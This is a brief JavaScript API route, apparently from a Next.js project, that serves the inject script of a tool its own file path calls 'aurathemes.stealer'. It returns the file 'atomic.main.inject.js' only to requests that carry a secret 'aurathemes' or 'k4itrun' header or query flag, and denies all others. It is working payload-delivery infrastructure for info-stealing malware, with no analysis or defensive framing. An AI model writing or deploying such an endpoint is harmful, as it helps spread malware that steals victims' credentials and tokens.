import fs from 'fs';
import path from 'path';
const injectPath = 'src/files/scripts/aurathemes.stealer/js/injects/atomic.main.inject.js';
export default async function handler(req, res) {
  try {
    if (
      req.headers['aurathemes'] === 'true' ||
      req.headers['k4itrun'] === 'true' ||
      req.query.aurathemes === 'true'
    ) {
      const injectFullPath = path.join(process.cwd(), injectPath);

      const code = await fs.promises.readFile(injectFullPath, 'utf8');
      res.setHeader('Content-Type', 'text/plain');
      res.status(200).send(code);
    } else {
      res.status(403).json({ error: 'Access denied.' });
    }
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).send('Internal Server Error');
  }
}
